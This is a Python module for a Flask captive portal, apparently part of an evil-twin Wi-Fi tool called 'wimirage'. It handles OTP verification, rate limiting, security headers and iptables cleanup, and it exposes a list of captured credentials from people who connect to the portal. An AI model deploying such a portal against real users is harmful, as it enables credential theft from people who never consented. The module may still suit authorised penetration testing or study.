"""Captive portal Flask application.

The ``CaptivePortal`` class wires together the Flask app, the OTP service, a
:mod:`~core.network` reference for granting internet on success, and the
shared :class:`~core.events.EventBus` / :class:`~utils.logger.CredentialLogger`.

Routes live in :mod:`portal.routes` and are mounted as a ``Blueprint`` here.
Security headers / cookies are configured explicitly in ``__init__``.
"""

import re
import threading
import logging
import secrets
from functools import wraps
from time import time
from typing import Optional, Callable

from flask import (
    Flask, request, make_response,
)

from utils.logger import CredentialLogger
from core.otp_service import OTPServiceInterface
from core.network import NetworkConfig, flush_iptables, backup_iptables, restore_iptables
from core.models import AppConfig
from core.events import EventBus
from core.paths import PORTAL_TEMPLATES_DIR, PORTAL_STATIC_DIR
from portal.routes import build_portal_blueprint
from portal.admin import build_admin_blueprint

logger = logging.getLogger("wimirage")

__all__ = ["CaptivePortal", "rate_limit", "validate_phone", "validate_email"]


def rate_limit(max_requests: int = 5, window_seconds: int = 60) -> Callable:
    """Decorator factory: 429 clients exceeding ``max_requests`` in ``window_seconds``.

    Note:
        Per-process counter with a ``threading.Lock`` guarding the dict
        (Flask's threaded dev server + any IO-thread overlap was racing
        on the bare dict; see ``test_captive_portal.py::TestRateLimit
        ::test_concurrent_decorator_is_thread_safe``). When the dict
        grows past ``_EVICTION_THRESHOLD`` unique IPs, oldest entries are
        evicted so long-running portals can't be DoS'd via unbounded
        key population. If you scale Flask across workers, swap this for
        a Redis-backed implementation.
    """
    def decorator(f: Callable) -> Callable:
        _requests: dict[str, list[float]] = {}
        _lock = threading.Lock()
        _EVICTION_THRESHOLD = 4096

        def _evict_if_needed(now: float) -> None:
            if len(_requests) < _EVICTION_THRESHOLD:
                return
            # drop keys with no recent requests
            stale = [
                ip for ip, hits in _requests.items()
                if not hits or now - hits[-1] >= window_seconds
            ]
            for ip in stale:
                _requests.pop(ip, None)

        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr or "0.0.0.0"
            now = time()
            with _lock:
                _evict_if_needed(now)
                bucket = _requests.get(ip)
                if bucket is not None:
                    bucket[:] = [t for t in bucket if now - t < window_seconds]
                else:
                    bucket = []
                    _requests[ip] = bucket
                if len(bucket) >= max_requests:
                    # Plain-text 429 — render_template() needs an app_context,
                    # which isn't guaranteed inside the decorator.
                    return make_response(
                        "Too many requests. Please wait.", 429
                    )
                bucket.append(now)
            return f(*args, **kwargs)
        return wrapped
    return decorator


def validate_phone(phone: str) -> bool:
    """Return True if ``phone`` looks like an E.164-compliant number."""
    if not isinstance(phone, str) or not phone:
        return False
    return bool(re.match(r'^\+?[0-9]{7,15}$', phone))


def validate_email(email: str) -> bool:
    """Return True if ``email`` matches a basic RFC-5322 shape."""
    if not isinstance(email, str) or not email:
        return False
    return bool(re.match(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$', email))


class CaptivePortal:
    """Flask-based captive portal with OTP verification.

    Args:
        config: Application config; supplies secret_key, ports, gateway, etc.
        otp_service: Optional OTP backend (``DemoOTPService`` / ``TwilioOTPService``).
            When ``None``, OTP auto-verifies.
        network_config: Optional reference used to grant verified clients
            internet access via :meth:`NetworkConfig.grant_internet`.
        event_bus: Optional EventBus; ``credential_submitted`` and
            ``otp_verified`` events are emitted when set.
        logger_instance: Optional ``CredentialLogger``. Defaults to a fresh one.
        ssl_context: Flask ``ssl_context`` kwargs (``"adhoc"`` for self-signed,
            or a tuple ``(cert.pem, key.pem)``). ``None`` for plain HTTP.
    """

    SECURITY_HEADERS = {
        "X-Frame-Options": "DENY",
        "X-Content-Type-Options": "nosniff",
        "X-XSS-Protection": "1; mode=block",
        "Referrer-Policy": "no-referrer",
        # Removal of 'unsafe-inline' — relies on the helper's nonce/hashed
        # references in template / static/script.js. See Section 3 #1.
        "Content-Security-Policy": (
            "default-src 'self'; "
            "style-src 'self'; "
            "script-src 'self'; "
            "img-src 'self' data:; "
            "object-src 'none'; "
            "frame-ancestors 'none'"
        ),
    }

    DEFAULT_PORTAL_PORT = 80
    MAX_CONTENT_LENGTH = 1024 * 1024  # 1MB hard cap on POST bodies (DoS guard)

    def __init__(self, config: AppConfig, otp_service: OTPServiceInterface | None = None,
                 network_config: NetworkConfig | None = None,
                 event_bus: EventBus | None = None,
                 logger_instance: CredentialLogger | None = None,
                 ssl_context: Optional = None) -> None:
        self.config = config
        self.otp_service = otp_service
        self.network_config = network_config
        self.event_bus = event_bus
        self.cred_logger = logger_instance or CredentialLogger()
        self.ssl_context = ssl_context

        self.app = Flask(
            __name__,
            template_folder=PORTAL_TEMPLATES_DIR,
            static_folder=PORTAL_STATIC_DIR,
        )

        # Security: never run with the placeholder secret in production (Section 3 #2).
        if config.secret_key == "change-me-in-production" or not config.secret_key:
            new_key = secrets.token_hex(32)
            self.app.secret_key = new_key
            logger.warning(
                "AppConfig.secret_key is unset/default — generated an ephemeral "
                "key for this run. Set AppConfig.secret_key for persistent sessions."
            )
        else:
            self.app.secret_key = config.secret_key

        # Cookie hardening (Section 3 #3/#4/#5). SECURE is only set when an
        # ssl_context is supplied — otherwise the browser would drop the cookie.
        self.app.config["SESSION_COOKIE_HTTPONLY"] = True
        self.app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
        if self.ssl_context is not None:
            self.app.config["SESSION_COOKIE_SECURE"] = True

        # DoS guard: cap the size of any POST body (Section 3 #11).
        self.app.config["MAX_CONTENT_LENGTH"] = self.MAX_CONTENT_LENGTH

        self._server_thread: threading.Thread | None = None
        # Per-decorator ``_requests`` dict lives in the closure of
        # ``rate_limit``, not on the instance. (Section 9 dead-code
        # sweep: a leftover ``self._rate_limit_store: dict`` from the
        # pre-F2 hardening lived here; it was never read or written
        # by ``rate_limit`` because each closure already carries its
        # own ``_requests`` / ``_lock``. Removed.)
        self._setup_app()

    def _register_cleanup_on_exit(self) -> None:
        """Hook ``atexit`` so iptables are flushed even on a hard crash (S-4).

        Re-running this is a no-op (guarded by a class flag) so the
        captive portal can be constructed multiple times in a test run
        without stacking callbacks.
        """
        if getattr(self.__class__, "_atexit_registered", False):
            return
        import atexit

        def _on_exit():
            # Best-effort: log + flush + restore to the pre-attack snapshot
            # (Section 9: backup_iptables captures the host's original NAT/
            # filter rules at setup time and restore_iptables replays them
            # so any unrelated (e.g. docker, wireguard) chains come back too).
            # If we can't reach iptables here, the operator's service
            # supervisor (systemd) is expected to invoke
            # ``utils.cleanup.register_cleanup_handler`` anyway.
            # Section 9 hardening: pytest's stream teardown can close
            # stdout mid-atexit, so we route the log line through a
            # ``try`` to swallow BrokenPipeError / ValueError instead of
            # crashing the interpreter's shutdown sequence.
            try:
                self.network_config_cleanup()
                restore_iptables()
            except Exception as e:
                try:
                    logger.error(
                        "atexit iptables flush+restore failed: %s: %s",
                        type(e).__name__, e,
                    )
                except (ValueError, OSError):
                    # Stream already closed (typical in pytest runs).
                    pass

        atexit.register(_on_exit)
        self.__class__._atexit_registered = True

    def network_config_cleanup(self) -> None:
        """Flush iptables + disable IP forwarding (delegated to network_config).

        Falls back to ``flush_iptables()`` standalone if the portal was
        constructed without a NetworkConfig (dev / unit-test paths).
        """
        if self.network_config is not None:
            try:
                self.network_config.cleanup()
                return
            except Exception as e:
                logger.error(
                    "NetworkConfig.cleanup failed: %s: %s; falling back.",
                    type(e).__name__, e,
                )
        # Fallback path — flush_iptables is imported into this module's
        # namespace at the top so test monkeypatching ``core.captive_portal
        # .flush_iptables`` actually intercepts the call.
        flush_iptables()

    def _setup_app(self) -> None:
        """Register the routes blueprint and the security-headers hook."""
        bp = build_portal_blueprint(
            otp_service=self.otp_service,
            network_config=self.network_config,
            event_bus=self.event_bus,
            cred_logger=self.cred_logger,
            config=self.config,
            rate_limit_per_minute=self.config.rate_limit_per_minute,
        )
        self.app.register_blueprint(bp)

        # Security fix S-2: the admin blueprint needs the same cred_logger
        # + event_bus the main blueprint uses, but routes through
        # ``portal.security.admin_required`` which gates every admin path.
        admin_bp = build_admin_blueprint(
            cred_logger=self.cred_logger,
            event_bus=self.event_bus,
        )
        self.app.register_blueprint(admin_bp)

        @self.app.after_request
        def add_headers(response):
            for header, value in self.SECURITY_HEADERS.items():
                response.headers[header] = value
            return response

        # Security fix S-4: hard-crash safety net so iptables + ip_forward
        # are restored even if the operator ^C's mid-capture. Idempotent.
        self._register_cleanup_on_exit()

    def start(self) -> None:
        """Boot Flask in a daemon thread; runs until :meth:`stop`."""
        logger.info(
            f"Starting captive portal on {self.config.gateway}:{self.config.portal_port}..."
        )
        run_kwargs = {
            "host": "0.0.0.0",
            "port": self.config.portal_port,
            "threaded": True,
            "debug": False,
        }
        if self.ssl_context is not None:
            run_kwargs["ssl_context"] = self.ssl_context
        self._server_thread = threading.Thread(
            target=self.app.run, kwargs=run_kwargs, daemon=True
        )
        self._server_thread.start()
        scheme = "https" if self.ssl_context else "http"
        logger.info(f"Captive portal running at {scheme}://{self.config.gateway}:{self.config.portal_port}")

    def stop(self) -> None:
        """Signal-stop the portal. Flask's dev server cannot be cleanly terminated; this is a no-op stub."""
        logger.info("Captive portal stopped.")

    def get_captured(self) -> list:
        """Return the in-memory list of captured credentials."""
        return self.cred_logger.get_all()
